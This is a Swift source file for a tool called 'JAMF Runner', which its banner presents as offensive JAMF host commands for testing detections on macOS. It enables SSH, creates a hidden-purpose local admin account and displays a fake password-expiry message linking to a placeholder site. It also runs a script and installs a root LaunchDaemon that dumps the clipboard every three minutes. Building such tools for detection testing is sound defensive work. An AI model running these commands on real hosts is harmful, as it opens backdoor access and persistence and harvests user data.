import Cocoa
import Foundation

let black = "\u{001B}[0;30m"
let red = "\u{001B}[0;31m"
let green = "\u{001B}[0;32m"
let yellow = "\u{001B}[0;33m"
let blue = "\u{001B}[0;34m"
let magenta = "\u{001B}[0;35m"
let cyan = "\u{001B}[0;36m"
let white = "\u{001B}[0;37m"
let colorend = "\u{001B}[0;0m"
let onmagenta = "\u{001B}[45m"
let binname = CommandLine.arguments[0]

func Banner(){
    print("\(cyan)+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\(colorend)")
    print("\(yellow)   ___  ___  ___  _________")
    print(##"  |_  |/ _ \ |  \/  ||  ___|"##)
    print(##"    | / /_\ \| .  . || |_     _ __ _   _ _ __  _ __   ___ _ __"##)
    print(##"    | |  _  || |\/| ||  _|   | '__| | | | '_ \| '_ \ / _ \ '__|"##)
    print(##"/\__/ / | | || |  | || |     | |  | |_| | | | | | | |  __/ |   "##)
    print(##"\____/\_| |_/\_|  |_/\_|     |_|   \__,_|_| |_|_| |_|\___|_|   "##)
    print("")
    print("JAMF Runner: \(colorend)Examples of offensive JAMF host commands. Useful for detections unit testing")
    print("\(yellow)author: \(colorend)@cedowens")
    print("\(cyan)+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\(colorend)")

    
}

func ListServer(){
    let proc = Process()
    proc.launchPath = "/usr/local/bin/jamf"
    let arguments : [String] = ["checkJSSConnection"]
    proc.arguments = arguments
    let pipe = Pipe()
    proc.standardOutput = pipe
    proc.launch()
    let results = pipe.fileHandleForReading.readDataToEndOfFile()
    let results2 = String(data: results, encoding: .utf8)!
    print("\(onmagenta)====>\(magenta)JSS Server Info:\(colorend)\(green)")
    print(results2)
    print("\(colorend)------------------------------")
}

func StartSSH(){
    let proc = Process()
    proc.launchPath = "/usr/local/bin/jamf"
    let arguments : [String] = ["startSSH"]
    proc.arguments = arguments
    let pipe = Pipe()
    proc.standardOutput = pipe
    do {
        try proc.launch()
        let results = pipe.fileHandleForReading.readDataToEndOfFile()
        let results2 = String(data: results, encoding: .utf8)!
        print("\(onmagenta)====> \(magenta)Attempting to starting ssh..\(colorend)\(green)")
        print(results2)
        print("\(colorend)------------------------------")
    }
    catch let error{
        print(error.localizedDescription)
        print("------------------------------")
    }
    
}

func CreateAccount(){
    let proc = Process()
    proc.launchPath = "/usr/local/bin/jamf"
    let arguments : [String] = ["createAccount","-username","testuser","-realname","Tester","-shell","/bin/zsh","-admin"]
    proc.arguments = arguments
    let pipe = Pipe()
    proc.standardOutput = pipe
    do {
        try proc.launch()
        let results = pipe.fileHandleForReading.readDataToEndOfFile()
        let results2 = String(data: results, encoding: .utf8)!
        print("\(onmagenta)====> \(magenta)Attempting to create a local admin user named \"testuser\"..\(colorend)\(green)")
        print(results2)
        print("\(colorend)------------------------------")
    }
    catch let error{
        print(error.localizedDescription)
        print("------------------------------")
    }
}

func DisplayMessage(){
    let proc = Process()
    proc.launchPath = "/usr/local/bin/jamf"
    let arguments : [String] = ["displayMessage","-message","Your password has expired. Please log into https://fakesite.com and update your password."]
    proc.arguments = arguments
    let pipe = Pipe()
    proc.standardOutput = pipe
    do {
        try proc.launch()
        let results = pipe.fileHandleForReading.readDataToEndOfFile()
        let results2 = String(data: results, encoding: .utf8)!
        print("\(onmagenta)====> \(magenta)Attempting to display the test message..\(colorend)\(green)")
        print(results2)
        print("\(colorend)------------------------------")
    }
    catch let error{
        print(error.localizedDescription)
        print("------------------------------")
    }
}

func CompName(){
    let proc = Process()
    proc.launchPath = "/usr/local/bin/jamf"
    let arguments : [String] = ["getComputerName"]
    proc.arguments = arguments
    let pipe = Pipe()
    proc.standardOutput = pipe
    do {
        try proc.launch()
        let results = pipe.fileHandleForReading.readDataToEndOfFile()
        let results2 = String(data: results, encoding: .utf8)!
        print("\(onmagenta)====> \(magenta)Attempting to get the local hostname..\(colorend)\(green)")
        print(results2)
        print("\(colorend)------------------------------")
    }
    catch let error{
        print(error.localizedDescription)
        print("------------------------------")
    }
}

func ListUsers(){
    let proc = Process()
    proc.launchPath = "/usr/local/bin/jamf"
    let arguments : [String] = ["listUsers"]
    proc.arguments = arguments
    let pipe = Pipe()
    proc.standardOutput = pipe
    do {
        try proc.launch()
        let results = pipe.fileHandleForReading.readDataToEndOfFile()
        let results2 = String(data: results, encoding: .utf8)!
        print("\(onmagenta)====> \(magenta)Attempting to list local users..\(colorend)\(green)")
        print(results2)
        print("\(colorend)------------------------------")
    }
    catch let error{
        print(error.localizedDescription)
        print("------------------------------")
    }
}

func RunScript(){
    let proc = Process()
    proc.launchPath = "/usr/local/bin/jamf"
    let arguments : [String] = ["runScript","-script","testing.scpt","-path","."]
    proc.arguments = arguments
    let pipe = Pipe()
    proc.standardOutput = pipe
    do {
        try proc.launch()
        let results = pipe.fileHandleForReading.readDataToEndOfFile()
        let results2 = String(data: results, encoding: .utf8)!
        print("\(onmagenta)====> \(magenta)Attempting to list local users..\(colorend)\(green)")
        print(results2)
        print("\(colorend)------------------------------")
    }
    catch let error{
        print(error.localizedDescription)
        print("------------------------------")
    }
}

func SchedTask(){
    let proc = Process()
    proc.launchPath = "/usr/local/bin/jamf"
    let arguments : [String] = ["scheduledTask","-command","\"osascript","-e","'return (the clipboard)'\"","-name","ClipTask","-user","root","-runAtLoad","-minute","'*/3/'"]
    proc.arguments = arguments
    let pipe = Pipe()
    proc.standardOutput = pipe
    do {
        try proc.launch()
        let results = pipe.fileHandleForReading.readDataToEndOfFile()
        let results2 = String(data: results, encoding: .utf8)!
        print("\(onmagenta)====> \(magenta)Attempting to create a scheduled task named ClipTask as root. If successful, you will find an entry at /Library/LaunchDaemons/com.jamfsoftware.task.ClipTask.plist. This is a test scheduled task that runs every 3 mins and uses osascript to dump clipboard contents.\(colorend)\(green)")
        print(results2)
        print("\(colorend)------------------------------")
    }
    catch let error{
        print(error.localizedDescription)
        print("------------------------------")
    }
}
let jamfpath1 = "/usr/local/bin/jamf"
let jamfpath2 = "/usr/local/jamf"
let flManager = FileManager.default

if (flManager.fileExists(atPath: jamfpath1) || flManager.fileExists(atPath: jamfpath2)){
    Banner()
    if CommandLine.arguments.count == 1{
        print("\(yellow) ATTEMPTING TO RUN ALL OPTIONS...")
        ListServer()
        StartSSH()
        CreateAccount()
        DisplayMessage()
        CompName()
        ListUsers()
        RunScript()
        SchedTask()
        
    }
    else {
        for argument in CommandLine.arguments{
            if argument.contains("-h"){
                print("Help menu:")
                print("\(yellow)JAMF Runner Options:\(colorend)")
                print("\(cyan)-ListServer -->\(colorend) Runs jamf checkJSSConnection to list the JSS server url")
                print("\(cyan)-StartSSH -->\(colorend)\(red)ROOT Req'd.\(colorend) Runs jamf startSSH to enable remote login")
                print("\(cyan)-CreateAccount --> \(colorend)\(red)ROOT Req'd.\(colorend) Runs jamf createAccount to create a local account")
                print("\(cyan)-DisplayMessage --> \(colorend)\(red)ROOT Req'd.\(colorend) Runs jamf displayMessage -message [string] to create a popup message to the user. This is a test message stating that the user's password has expired.")
                print("\(cyan)-ComputerName --> \(colorend)Runs jamf getComputerName to capture the local hostname")
                print("\(cyan)-ListUsers --> \(colorend)Runs jamf listUsers to display local user accounts")
                print("\(cyan)-RunScript --> \(colorend)\(red)ROOT Req'd.\(colorend) Runs jamf runScript to run a local script...This will run the testing.scpt AppleScript file included in this repo. You simply need to copy it to the same directory that you build your macho to.")
                print("\(cyan)-ScheduledTask --> \(colorend)\(red)ROOT Req'd.\(colorend) Runs jamf scheduledTask to create a scheduled task. This will add the preconfigured ClipTask (runs osascript to dump the clipboard) as a LaunchDaemon that runs at 3 minute intervals. You can find this LaunchDaemon at /Library/LaunchDaemons as com.jamfsoftware.task.ClipTask.plist")
                print("")
                print("\(yellow)Usage:\(colorend)")
                print("To specify certain options:  \(binname) [option1] [option2] [option3]...")
                print("")
                exit(0)
            }
            else {
                if argument.contains("-ListServer"){
                    ListServer()
                }
                if argument.contains("-StartSSH"){
                    StartSSH()
                }
                if argument.contains("-CreateAccount"){
                    CreateAccount()
                }
                if argument.contains("-DisplayMessage"){
                    DisplayMessage()
                }
                if argument.contains("-ComputerName"){
                    CompName()
                }
                if argument.contains("-ListUsers"){
                    ListUsers()
                }
                if argument.contains("-RunScript"){
                    RunScript()
                }
                if argument.contains("-ScheduledTask"){
                    SchedTask()
                }
            }
        }
    }
    
}
else {
    print("\(red) [-] jamf agent not found on this host. Exiting...")
    exit(0)
}



